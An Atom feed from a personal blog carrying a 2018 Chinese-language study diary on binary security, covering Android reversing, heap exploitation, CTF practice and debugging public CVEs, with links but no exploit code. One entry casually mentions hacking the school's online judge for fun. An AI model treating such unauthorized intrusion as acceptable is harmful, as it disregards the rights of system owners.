<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sakuraのblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://eternalsakura13.com/"/>
  <updated>2022-12-06T03:18:42.511Z</updated>
  <id>http://eternalsakura13.com/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sakuraのdiary</title>
    <link href="http://eternalsakura13.com/2099/09/18/study/"/>
    <id>http://eternalsakura13.com/2099/09/18/study/</id>
    <published>2099-09-18T14:05:42.000Z</published>
    <updated>2022-12-06T03:18:42.511Z</updated>
    
    <content type="html"><![CDATA[<h2 id="建了一个知识星球：天问之路"><a href="#建了一个知识星球：天问之路" class="headerlink" title="建了一个知识星球：天问之路"></a>建了一个知识星球：天问之路</h2><p>如果想学习二进制安全，或者和我交流，欢迎来这里找我w<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-06-22-034815.jpg" alt=""></p><h2 id="2018-1-28"><a href="#2018-1-28" class="headerlink" title="2018-1-28"></a>2018-1-28</h2><p>1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）<br>2.配置shadow<br>尝试用gdb和gdbserver来调试<br><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a><br><a href="https://developer.android.com/ndk/downloads/index.html?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads/index.html?hl=zh-cn</a><br><a href="http://kiya.studio/2017/06/21/android-gdb/" target="_blank" rel="noopener">http://kiya.studio/2017/06/21/android-gdb/</a><br>shadow文档的几个坑点</p><ul><li>arm-linux-androideabi-gdb，也就是gdb-arm版没有提供，要自己找，我装了一个ndk r10e，然后弄了一个，嗯，r11移除了gdb。</li><li>在gdb remote之前，文档里没有写forward转发，导致我试的时候一直refuse</li></ul><p>3.晚上最大的收获是看到了一个不错的blog（android逆向CTF）<br><a href="http://kiya.studio/2333/03/03/android-reversing-skills/#more" target="_blank" rel="noopener">http://kiya.studio/2333/03/03/android-reversing-skills/#more</a></p><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018-1-29"></a>2018-1-29</h2><ol><li>看玄武的<a href="https://mp.weixin.qq.com/s/mOaXkGTY2704P6TV2KBvwg" target="_blank" rel="noopener">每日安全推送</a>，主要看了WinAFL</li><li>nexus5被我刷成砖……然后顺手把刷机、root和装xposed全都整理了一遍。</li><li>webkit的poc断点找到了，可以调了</li><li>做了一道阿里CTF第二题，一道关于反调试的题。</li></ol><h2 id="2018-1-31"><a href="#2018-1-31" class="headerlink" title="2018-1-31"></a>2018-1-31</h2><ol><li>看AI直播调webkit，感觉调浏览器好难呀。</li><li>看玄武的<a href="https://mp.weixin.qq.com/s/M4QZxs_G-lZ810o_i2KJhA" target="_blank" rel="noopener">每日安全推送</a>，主要关注了反调试和使用Strava 热力图来推断军事基地位置，很有趣的思路。</li><li>研究了一下加固原理和脱壳基础：dvmDexFileOpenPartial，还挺简单的。</li><li>研究了ptrace和调试器原理，了解了ptrace反调试的一些技巧</li></ol><h2 id="2018-2-1"><a href="#2018-2-1" class="headerlink" title="2018-2-1"></a>2018-2-1</h2><ol><li>本来想今天研究一下ndk编译的，不过睡着了……然后也没看什么东西</li><li>帮学弟解决了一些搭建博客的bug，顺便自己把博客的主题配色，代码高亮，搜索，评论什么的都修改或添加了，好看多了……</li></ol><h2 id="2018-2-2"><a href="#2018-2-2" class="headerlink" title="2018-2-2"></a>2018-2-2</h2><ol><li>看玄武的<a href="https://xuanwulab.github.io/cn/secnews/2018/02/02/index.html" target="_blank" rel="noopener">每日安全推送</a></li><li>钓鱼网站那个很有趣，我就测试了一下，然后因为ss代理不走终端，找了<a href="https://juejin.im/entry/5821840cd203090055134cc0" target="_blank" rel="noopener">一篇文章</a>和<a href="https://blog.kelu.org/tech/2017/07/06/parallels-vm-use-proxy-with-host-on-mac.html" target="_blank" rel="noopener">另一篇文章</a>，配置了一下就好了~</li><li>自己实践了一下那个钓鱼工具，实践文章和终端那个都可以在”杂项”分类里找到</li><li>研究了一下怎么用ndk-build编译一个能在手机上运行的c程序，这样明天就可以尝试hook了</li></ol><h2 id="2018-2-3"><a href="#2018-2-3" class="headerlink" title="2018-2-3"></a>2018-2-3</h2><ol><li>今天没有玄武的推送看~</li><li>研究了android native层hook，算是学到不少东西了。</li></ol><h2 id="2018-2-4"><a href="#2018-2-4" class="headerlink" title="2018-2-4"></a>2018-2-4</h2><ol><li>写了第一个xposed程序~遇到了一些坑，不过还是趟过去了。</li><li>修改nexus5的boot.img,打开系统调试，又坑了我一会。。</li></ol><h2 id="2018-2-5"><a href="#2018-2-5" class="headerlink" title="2018-2-5"></a>2018-2-5</h2><ol><li>今天出去怠惰了（茶）</li><li>xposed继续学习了一下，学会了一些姿势，感觉还是不错的~</li></ol><h2 id="2018-2-6"><a href="#2018-2-6" class="headerlink" title="2018-2-6"></a>2018-2-6</h2><ol><li>研究了怎么搭建shadowsocks服务端和优化</li><li>自己写了一个基于flask的B/S端口扫描器，代码太难看就不放了（茶</li></ol><h2 id="2018-2-7"><a href="#2018-2-7" class="headerlink" title="2018-2-7"></a>2018-2-7</h2><ol><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/FM-mZh1e8YQP0MWrV1IlVw" target="_blank" rel="noopener">2.6</a>和<a href="https://mp.weixin.qq.com/s/2JMrsyyuTErVy-pXRoL3Jg" target="_blank" rel="noopener">2.7</a><br>wordpress DOS有点意思，不过没搞懂，另外主要看了android安全公告2月版，看懂了一些（限于原理），开发太菜了。</li><li>学习了android的jni开发，基本的都摸了一遍。</li></ol><h2 id="2018-2-8"><a href="#2018-2-8" class="headerlink" title="2018-2-8"></a>2018-2-8</h2><ol><li>继续昨天的jni学习，摸清了native方法的动态注册</li><li>研究了下.init_array,结合jni动态注册，做了一道CTF题</li><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/sqPmC-z-HiH4UKArE1Gdgw" target="_blank" rel="noopener">2.8</a>,这篇<a href="https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html" target="_blank" rel="noopener">钓鱼</a>的有趣</li><li>给AI写了个爬页面上文件的爬虫。</li></ol><h2 id="2018-2-9"><a href="#2018-2-9" class="headerlink" title="2018-2-9"></a>2018-2-9</h2><ol><li>研究android构建过程，Gradle工作流程</li><li>读玄武每日推送（存了个移动端静态分析的github准备好好看看）</li></ol><h2 id="2018-2-10"><a href="#2018-2-10" class="headerlink" title="2018-2-10"></a>2018-2-10</h2><ol><li>研究Dex文件格式和修复</li><li>学习了用ddms来dump出运行内存做题的技巧。</li><li>学习了新建android工程，调so文件解题。</li></ol><h2 id="2018-2-11"><a href="#2018-2-11" class="headerlink" title="2018-2-11"></a>2018-2-11</h2><ol><li>把昨天看到一道递归算法的android re做了，感觉现在做一般的CTF都有点思路了，做看雪的还是GG，还要提高姿势水平。</li><li>今天上午看到我在知乎的提问有师傅回答我了：<a href="https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。" target="_blank" rel="noopener">https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。</a></li><li>今天下午做完题就又瞎看了一会，思考我是不是选错了方向……android的调试贼麻烦，资料还贼少，看了看看雪，主要是浏览器、文件格式和内核，虽然其实都一样的，那些资料也不多，没法挖洞的……认识的dalao又少，没法充分交流QAQ，唉，感觉我是不是不适合当黑客，看vulcan的师傅微博，月月一大批CVE，就我什么都挖不到，不过今晚看了看师傅们的博客，他们的心路历程给了我很大勇气，是的，我早就不打算退后了，只有前进而已。</li></ol><h2 id="2018-2-12"><a href="#2018-2-12" class="headerlink" title="2018-2-12"></a>2018-2-12</h2><ol><li>今天刷空间看到moctf比赛，就参加了下，把android/linux re做掉就没看了。</li><li>依然很迷茫，不过其实想想，我开始学二进制，其实也就不到半年，进步速度并不是不能接受，只是在技能进阶上卡住了又没人交流而已，嗯，再想想好了。</li></ol><h2 id="2018-2-13到19"><a href="#2018-2-13到19" class="headerlink" title="2018-2-13到19"></a>2018-2-13到19</h2><ol><li>这些天几乎都过年去了……然后唯一做了点事就是把自己的课程设计做了，<a href="https://github.com/eternalsakura/PortScan" target="_blank" rel="noopener">PortScan</a></li><li>新年新气象，最近家里的事情也是乱七八糟，能多学点赚钱的技术分担压力就好了。</li><li>下学期的计划——fuzz、CVE漏洞研究、前端后端的一些Web开发（写点相关项目练手），然后找实习。</li><li>学会了一项新的运动，保龄球，很有意思。</li><li>最近一直什么都没学，自己也在反思一些东西，寻找一个前进的点。<br>比如浏览器，文件格式，还是内核，或者其他，还是都不是。<br>安全只是个抽象的概念，具体化了才能变成业务。<br>我还需要探究一段时间，读很多的漏洞分析文章，追随前辈们走过的路途，再进一步反思。<br>“一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&gt; exploitable bug(vulnerability) –&gt; poc –&gt; exploit –&gt; reliable/weaponized exploit。虽然大家都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但我们真正关心的漏洞应该是能到最后两个阶段的vulnerability。”</li></ol><h2 id="2018-2-20到21"><a href="#2018-2-20到21" class="headerlink" title="2018-2-20到21"></a>2018-2-20到21</h2><ol><li>返校真是艰难……飞机火车客车出租全都转了一遍才到……</li><li>晚上收拾了下房间，看了看看雪，发现师傅做的有趣CTF题，<a href="https://bbs.pediy.com/thread-224686.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224686.htm</a></li><li>群里在讨论内存管理和hook，被推荐了一本腾讯的手游安全的书《游戏安全：手游安全技术入门》，还不错，可以入个门……</li><li>看到一个博客提供了一些自定义ROM的资料，最近也想改，看到了就记录一下。<a href="https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338" target="_blank" rel="noopener">https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338</a></li></ol><h2 id="2018-2-22"><a href="#2018-2-22" class="headerlink" title="2018-2-22"></a>2018-2-22</h2><ol><li>看了《手游安全技术那本书》，学习了注入技术。</li><li>下午买了考虫的口语能力提升班，然后学习了下</li><li>晚上在seebug逛，找各种二进制漏洞分析的资料，然后看到了陈良的ppt,remet的github,韩子诺的文章，还有很多很多……CVE-2014-7911感觉可以调调，我得整理整理我搜的资料，然后按照原理-&gt;漏洞分析-&gt;exp去学习w</li></ol><h2 id="2018-2-23到25"><a href="#2018-2-23到25" class="headerlink" title="2018-2-23到25"></a>2018-2-23到25</h2><ol><li>是的，仔细算算，我已经编译AOSP编译了三天了，而且还没编译好……现在已经基本放弃在mac上编译了，我现在突然想,flanker大神之所以用ubuntu做主力机……是不是因为在mac上编译不出AOSP呀……(逃)</li><li>明天在旧电脑上装win/ubuntu的双系统，要不是因为这学期有win网络编程和c#开发……我就直接烧ubuntu进去了（撑脸</li><li>嗯，不用明天了，在今天的收尾……新学期的开始……我终于是守得云开见月明，把AOSP弄出来了！</li></ol><h2 id="2018-2-26"><a href="#2018-2-26" class="headerlink" title="2018-2-26"></a>2018-2-26</h2><ol><li>学习了stack pivot</li><li>学习了heap spray,<a href="http://secwiki.neu.edu.cn/wiki/images/f/fe/%E5%86%85%E5%AD%98%E5%96%B7%E5%B0%84%E5%9C%A8%E5%AE%89%E5%8D%93Root%E5%88%A9%E7%94%A8%E4%B8%AD_%E9%99%88%E8%89%AF.pdf" target="_blank" rel="noopener">堆喷</a></li><li>学习了<a href="http://pwn4.fun/2016/11/20/C-虚函数调用攻防战/" target="_blank" rel="noopener">虚表攻防</a></li><li>了解android<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back.pdf" target="_blank" rel="noopener">root</a></li><li>Time-of-check Time-of-use (TOCTOU) Race Condition</li><li>今天还是认真的研究了一下之前没调出来的cve-2015-3864，因为这个漏洞有完整的利用链资料，非常的棒，虽然可能调不了什么的，但是理解这个利用过程也很有意义。<br>还是要感谢一下看雪师傅的<a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">文章</a>，还加了好友0.0，感觉要是我一开始就是编译的AOSP去调试……可能寒假就调出来了2333，反正感觉今天还是很有收获的。</li></ol><h2 id="2018-2-27"><a href="#2018-2-27" class="headerlink" title="2018-2-27"></a>2018-2-27</h2><ol><li>一上午调了道64位rop，还没调出来..exm???是这题的错还是我的错…多看看别人的exp好了，以前还是做题不够，积累不够。</li><li>继续看stagefright好了，争取今天多少调一调。</li><li>好吧，没看进去，gp0的exp大致看懂了，不过metaphor的思路还是费解，可能我现在的理解力还是不够。</li><li>下午一直在整理之前看的ptmalloc的一些基本概念，虽然意义不是很大，但是理一理总是好的，还是要为ctf-wiki打call，里面写了非常多的干货，明天继续整理。</li></ol><h2 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h2><ol><li>体育课累死……密码学数学基础有趣。</li><li>今天把heap exploit的unlink整理了一下，虽然最后那个例子有点问题，我换了两个系统都没成功，但是原理还是理清了，真的是都快忘了……</li></ol><h2 id="2018-3-1"><a href="#2018-3-1" class="headerlink" title="2018-3-1"></a>2018-3-1</h2><ol><li>又混了篇看雪的优秀，感觉还是蛮有成就感的，自己发的文章都不是优秀就是精品。</li><li>今天有点怠惰呢，明天要继续努力。</li></ol><h2 id="2018-3-2"><a href="#2018-3-2" class="headerlink" title="2018-3-2"></a>2018-3-2</h2><ol><li>今天一天都在整理fastbin的一个内容（其实还玩了一会Web，黑掉学校OJ嘿嘿嘿）</li><li>这道赛题略难，然后跟团队练习赛的PragyanCTF，感觉这赛题像是file io啊。。谁出的题这么皮。。</li></ol><h2 id="2018-3-3"><a href="#2018-3-3" class="headerlink" title="2018-3-3"></a>2018-3-3</h2><ol><li>生日快乐~自己，去订了蛋糕，今天继续研究了一下那个fastbin的题，真的很难。。</li><li>把android kernel也编译了出来，这次真的是可以调了。。</li></ol><h2 id="2018-3-4"><a href="#2018-3-4" class="headerlink" title="2018-3-4"></a>2018-3-4</h2><ol><li>今天和实验室大一的聊了下，然后把我能知道的东西，方向什么的，都聊了一下。</li><li>9447 CTF 2015的fastbin是真的难……我还是不懂，算了算了，明天看点别的吧，这个todo。</li><li>今天和一个师傅聊了下IoT漏洞应该怎么挖，受益匪浅，但是转换为具体的硬实力还需要多看多学多调。</li></ol><h2 id="2018-3-5"><a href="#2018-3-5" class="headerlink" title="2018-3-5"></a>2018-3-5</h2><ol><li>今天把那道fastbin的题认真的理了理，其实也不是很难，然后又把pragyan ctf2018的两道pwn题做了一下，第一道还好，那个目录遍历没理解上，看了wp会了，第二道就有点迷，静态链接下的格式化字符串漏洞，没办法覆盖got表，看了一篇wp是覆盖malloc_hook，这不是我白天看的那道fastbin的套路么……真的是……然后打开栈执行，这……真是脑洞，又感觉自己很菜……</li><li>嗯w，文章又被看雪推送了，还是感觉蛮不错的……希望能认识更多人吧w，今天看了看玄武每日推送的目录，非常nice，准备找个时间把这段时间没看的都啃一下。</li></ol><h2 id="2018-3-6"><a href="#2018-3-6" class="headerlink" title="2018-3-6"></a>2018-3-6</h2><ol><li>上周的比赛，搞到今天总算是大致调完了，就只剩一个点不懂，也是实在搞不懂了，教主说的很有道理，只有把文章写成博客，发出去，才能检验你到底对这个东西的理解怎么样，事实上，也只有在学习中的我，才会如此详细的写wp吧。</li></ol><h2 id="2018-3-7-8"><a href="#2018-3-7-8" class="headerlink" title="2018-3-7-8"></a>2018-3-7-8</h2><ol><li>这两天把漏洞战争的环境大致搭了一下，从用windbg到看到符号，还是折腾了一下。</li></ol><h2 id="2018-3-9-10"><a href="#2018-3-9-10" class="headerlink" title="2018-3-9-10"></a>2018-3-9-10</h2><ol><li>调了一下漏洞战争堆的第一个binary，然后熟悉了一下工具使用，还是nice.</li><li>调了cve-2012-1876的poc，发现了一些书上没有提到的地方和一个错误，就不提勘误了…都出了这么久了…原理差不多懂了，很有趣。</li><li>今天有意想不到的收获，或者说机会吧，希望我能把握好，然后做好安全研究，成为一个优秀的黑客。</li><li>列一个CVE调试计划吧，目前进度1/10<br>浏览器</li><li>7 CVE-2012-1876,堆溢出（p2o ie9)</li><li>3 CVE-2011-0027,整数溢出漏洞 (p2o ie8)</li><li>6 CVE-2013-2551,整数溢出漏洞(p2o ie10)</li><li>4 CVE-2013-1347,UAF(ie)<br>android</li><li>7 CVE-2014-3153 anroid kernel提权</li></ol><h2 id="2018-3-11-12"><a href="#2018-3-11-12" class="headerlink" title="2018-3-11-12"></a>2018-3-11-12</h2><ol><li>这两天进度比较低迷，第一天直接莽上去调exp然后被打脸…今天把vupen的文章仔细读了一遍，把整个利用过程理解了一下。</li><li>说来有个有趣的点，p2o之后cve-2012-1876不是应该补了么，怎么在win8+ie10上还能利用，更有趣的是vupen明明用这个洞getshell了ie9，但是为什么keen在Study of Exploit Migitation in Modern Browsers这个ppt上说了bstr的分配不再能被利用，那vupen到底是怎么写的exp…</li><li>最近的计划（才怪…</li></ol><ul><li>编译的前端后端</li><li>kernel的漏洞</li><li>看diff写poc…</li></ul><h2 id="2018-3-13-14"><a href="#2018-3-13-14" class="headerlink" title="2018-3-13-14"></a>2018-3-13-14</h2><ol><li>密码学数学基础和算法这些课也就算了，晚上还有软件开发的课，各种文档什么的…能不能好好lu代码，把之前写的项目project答辩完了。</li><li>等到了想等的结果，收心认真学习了。</li><li>晚上把计算机系统素养里的部分内容（VM）又看了一下，十分有意义。</li><li>为了学编译原理，先自己lu一个c语言解释器了解个大概吧。</li></ol><h2 id="2018-3-15-17"><a href="#2018-3-15-17" class="headerlink" title="2018-3-15-17"></a>2018-3-15-17</h2><ol><li>这几天把write a c interpret看完了，大致了解了编译器前后端，当然肯定现在还是不会写的。</li><li>调cve-2012-7864,虽然称不上调通exp，但是大部分都调出来了，poc调的很顺利，在exp就处处踩坑。</li><li>说来好像webkit的dom的堆被分开了，以后就不会有那么多uaf了。</li></ol><h2 id="2018-3-18-20"><a href="#2018-3-18-20" class="headerlink" title="2018-3-18-20"></a>2018-3-18-20</h2><ol><li>日记还是要每天记……都忘了自己每天做了什么了……把c++的project做完了，做了两道pwn题。</li><li>看了一下LCTF2017的题目,large bin的unlink确实没练过，还有一道simpleVM改的题，都做做好了。</li></ol><h2 id="2018-3-21-25"><a href="#2018-3-21-25" class="headerlink" title="2018-3-21-25"></a>2018-3-21-25</h2><p>lctf2017的题目里学到不少东西，另外关于堆利用的姿势实在是不足，此外无libc利用这个也要再学习一下。<br>这几天除了两个project写，还打了强网杯，感觉就是什么都不会吧。。可能不该死磕一道题，应该都看看？…啊啊啊，难受死了，离顶尖水平差的根本不是一点半点……<br>还看了一篇清华的论文，非常nice。<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1</a><br>还是有的挫败呢，离别人的水平。</p><h2 id="2018-3-26"><a href="#2018-3-26" class="headerlink" title="2018-3-26"></a>2018-3-26</h2><p>1.读玄武每日推送[<a href="http://chuansong.me/n/2253059751415]" target="_blank" rel="noopener">http://chuansong.me/n/2253059751415]</a>.</p><ul><li>mark一下<a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">windows kernel漏洞利用</a>，mark一下k0师傅的<a href="https://whereisk0shl.top/post/2018-03-21" target="_blank" rel="noopener">UBUNTU 16.04 EBPF ARBITRARY READ/WRITE 漏洞分析</a>和360src的<a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">这篇</a>,看来调kernel还是有的调。</li><li>看到的<a href="https://github.com/sashs/arm_exploitation/blob/master/exploitation_on_arm_based_systems.pdf" target="_blank" rel="noopener">ARM exp开发</a>就很简略，感觉学不到什么东西。</li><li>mark一个超棒的<a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">linux kernel交互图</a>，还能在页面上点击跳转到资料<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-LKM3_2048.png" alt=""></li><li>还有一个Stack pivoting  exploit的图收了,不知道他们怎么画的图这么好看。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-030340.jpg" alt=""></li><li><a href="https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5a00963153450a8779b23489/1509987890282/Windows" target="_blank" rel="noopener">windows注册表审计</a>感觉以后用得到</li><li><a href="https://twitter.com/_niklasb/status/977141034059747328" target="_blank" rel="noopener">p2o的沙盒逃逸漏洞</a>这个感觉十分有意思。</li><li>blackhat上总有很多好议题，比如这个<a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">绕过ASLR的新思路</a></li></ul><p>2.准备配linux kernel的调试环境，真的是……配不起来啊，双机调试，拉取符号文件，设置串口，改配置开启调试功能。rbq,rbq<br>3.加入了chamd5团队，有师傅一起学pwn，一起讨论真是太棒了QVQ</p><h2 id="2018-3-27"><a href="#2018-3-27" class="headerlink" title="2018-3-27"></a>2018-3-27</h2><ol><li>上午和出强网杯kernel题的师傅聊了一下kernel的调试环境搭建和赛题，师傅人蛮好。。<br>搭建的话，muhe师傅的<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85837</a></li></ol><p><strong>编译linux 注意去掉不必要的东西，然后编译busybox 然后插入内核写linux init 最后制作cpio</strong><br>这样就可以qemu+gdb调试了，很nice。</p><ol start="2"><li>下午和晚上忙各种杂七杂八的事情反正……不过总算还是把要复盘的赛题做完了。</li><li>另外，感觉自己的努力和天赋还是被人肯定的，加油吧，自己QVQ。</li></ol><h2 id="2018-3-28"><a href="#2018-3-28" class="headerlink" title="2018-3-28"></a>2018-3-28</h2><ol><li>人生这种东西，其实就是起起落落落落落落落落落落落落落落落落落落落落落落落落落落落落，23333<br>瞎看了半天linux inside，还看了下linux x86-64 asm，感觉没什么进展。</li><li>晚上在知乎提了个问题，别人指了一条很nice的路线给我，还和其他人get了一点点资料，感觉我应该也是可以搞的吧，嗯哼。<br>其实今天一直比较浮躁，还是昨天晚上的一些后遗症吧，还有就是期望和现实的落差……<br>不过冷静的回想一下，不能让自己立刻从舒适区脱离，从新掌握新的知识，那怎么进步呢？且行且努力（乖巧</li></ol><h2 id="2018-3-29"><a href="#2018-3-29" class="headerlink" title="2018-3-29"></a>2018-3-29</h2><ol><li>这几天事挺多的，今天才把blackhat的ppt都下载下来,然后看了下<a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="noopener">linux符号解析</a>还发现了一个<a href="https://github.com/elfmaster/skeksi_virus" target="_blank" rel="noopener">正在开发中的linux病毒</a></li><li>收集了蛮多linux kernel资料慢慢啃……今天啃了两个ppt，纯英文的那么多……我也是很意外自己读起来没什么障碍的……<br>学什么都要一步一步呀，能调通一个，调试就没什么了，后面的学习速度就看对于kernel和保护的理解了。</li></ol><h2 id="2018-3-30-31"><a href="#2018-3-30-31" class="headerlink" title="2018-3-30-31"></a>2018-3-30-31</h2><ol><li>这两天发生的事情还蛮多的，最近发生的一些事让我觉得，自己调的真洞还是太少，调就要调出来还要能调通，不过说实话吧……浏览器和kernel的洞真的不好调，我学二进制又不久……现在比赛练pwn都来不及，还要分身调洞，确实有点难啊……</li><li>不过kernel的ppt啃了俩，感觉纯英文的资料也就那个样子了，读起来还是挺流畅的，要是真的不懂换成中文我也不懂……</li><li>把kernel题的环境搭起来了，有师傅请教真的是比自己搞好太多……另外堆的题感觉有感觉了，准备给自己一个比较长的训练周期，比如十天，彻底脑内模拟透，最近进步还是蛮多，加油。<br>mark一个师傅的<a href="http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">博客</a></li></ol><h2 id="2018-4-1-3"><a href="#2018-4-1-3" class="headerlink" title="2018-4-1-3"></a>2018-4-1-3</h2><ol><li>打了一场0ctf，感觉自己还是太菜，不过在师傅们的帮助下，把能搞懂的题都搞懂了，学到很多很多东西，还是很开心的。</li><li>写wp太麻烦了坦白说。。不过还是写吧，不写的话自己都不知道能记得多久……</li></ol><h2 id="2018-4-4-11"><a href="#2018-4-4-11" class="headerlink" title="2018-4-4-11"></a>2018-4-4-11</h2><ol><li>这几天电脑键盘坏了，电脑送修什么都没干。下了个吃鸡手游，嗯，还挺好玩的，今天早上电脑到了删了。</li><li>把0ctf2018的4道pwn复盘完了，折腾kernel调试环境。。还是挺麻烦的。</li><li>想要的很简单，得到却很难，好想去实验室做安全研究。</li></ol><h2 id="2018-4-12"><a href="#2018-4-12" class="headerlink" title="2018-4-12"></a>2018-4-12</h2><ol><li>今天从qemu+gdb，各种花式报错，到搭建内核的双机调试，简直了……总算最后是勉强在win机器上弄好了。<br>今天得到的一个启发是，先找一个可以用的方案去做，不要想什么一次做到最好，到有机会再换方案。</li><li>英语作业还没做……唉……赶作业赶作业……</li></ol><h2 id="2018-4-13"><a href="#2018-4-13" class="headerlink" title="2018-4-13"></a>2018-4-13</h2><ol><li>今天也是一堆事情，睡到中午然后开始做ddctf，那个逆向的mips还有android逆向的RSA，pwn的win kernel exploit真的是有、意思。反正我不想做了，不如学习一个<a href="https://blog.betamao.me/2018/02/26/ptmalloc%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">新姿势</a></li><li>linux kernel调试的环境算是彻底搭好了，今天解决了两个昨天没解决的bug，已经可以看到源码了。</li></ol><h2 id="2018-4-14-15"><a href="#2018-4-14-15" class="headerlink" title="2018-4-14-15"></a>2018-4-14-15</h2><ol><li>解决了内核不能单步调试的问题，然后在复习信安数学了。。再不看要凉了</li><li>仔细跟了一下poc，感觉还是能看懂的。</li></ol><h2 id="2018-4-16-17"><a href="#2018-4-16-17" class="headerlink" title="2018-4-16-17"></a>2018-4-16-17</h2><ol><li>自己看了下日记，4月除了修电脑配环境，几乎什么都没做，这段时间心态太浮躁了，嗯，加个太，也要准备投几家实习了，本来以为可以拿到的offer，都感觉凉了，不过算了，我是要去实验室做安全研究的人呢。</li><li>分析了cve-2017-8890的漏洞成因和模型还有patch</li></ol><h2 id="2018-4-18"><a href="#2018-4-18" class="headerlink" title="2018-4-18"></a>2018-4-18</h2><ol><li>今天也是一堆的课，晚上和师傅们聊天聊八卦去了。。结果只把UAF对象的分配和释放调了调。</li><li>了解了一下实验室面试啥的，要好好调CVE了。</li></ol><h2 id="2018-4-19"><a href="#2018-4-19" class="headerlink" title="2018-4-19"></a>2018-4-19</h2><ol><li>看了看师傅们的面试题，觉得其实自己还能再抢救一下。。</li><li>今天看了长亭的kernel的洞，感觉分析成因还是很好分析的…但是exp调起来麻烦，也懒得写博客记录了，今天把webkit的调试记录了一下，明明好久之前就搞了，结果到现在还是这样没什么进展（茶</li></ol><h2 id="2018-4-20-21"><a href="#2018-4-20-21" class="headerlink" title="2018-4-20-21"></a>2018-4-20-21</h2><ol><li>编了一天v8，搞不出来，墙真讨厌。</li><li>调（看）了一个webkit的UAF漏洞，还行，感觉最难懂的还是对象之间的引用关系太复杂，还有就是回调函数跟着跟着容易找不到自己在哪。<br>“我是谁，谁在打我。”（逃）</li></ol><h2 id="2018-4-22-24"><a href="#2018-4-22-24" class="headerlink" title="2018-4-22-24"></a>2018-4-22-24</h2><ol><li>打了一场*ctf，又学到了新姿势。</li><li>在看v8，看JIT，看R大的回答，xjb搜文章，还是不错。</li><li>调通了p2o的一个v8的oob的洞，cve-2017-5053,还是不难。</li></ol><h2 id="2018-4-25-28"><a href="#2018-4-25-28" class="headerlink" title="2018-4-25-28"></a>2018-4-25-28</h2><ul><li><p>补一些浏览器的基础吧</p></li><li><p>学习了一下一个新的内核洞，有新的trick总结</p></li><li><p>最近觉得该搞搞利用了，路由器固件也可以玩一下，安全研究这么有趣，什么都能摸一下（才怪</p></li></ul><h2 id="2018-4-29-30"><a href="#2018-4-29-30" class="headerlink" title="2018-4-29-30"></a>2018-4-29-30</h2><ol><li>国赛打完了，各种不走心，状态奇差，混进赛区半决赛了，CTF也玩到这了吧先，后面好好研究浏览器。</li><li>看了Natalie Silvanovich写的How to Find JavaScript Vulnerabilities with Code Review</li></ol><ul><li>Determine intended functionality</li><li>Review implementation of important features</li><li>Review previously reported bugs</li><li>Brainstorm likely vulnerable areas</li><li>Review code!<br>Mozilla docs (MDN) is a great start for JS</li></ul><ol start="3"><li>想翻一些议题视频看的时候翻到了一个仓库，js vul的，存一下，<a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">js-vuln-db</a></li></ol><h2 id="2018-4-31-5-2"><a href="#2018-4-31-5-2" class="headerlink" title="2018-4-31-5.2"></a>2018-4-31-5.2</h2><ol><li>看了一个js optimized code<a href="https://www.microsoft.com/en-us/research/video/chakra-script-optimized-code/" target="_blank" rel="noopener">视频</a>，虽然是chakra的<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-02-074634.png" alt=""><br>不过感觉，有点没用…这些我都知道（</li><li>看v8的gc,利用和各种，反正还是挺迷的，先看吧QVQ</li><li>看到一幅很棒的图，新的v8的执行图？<br><img 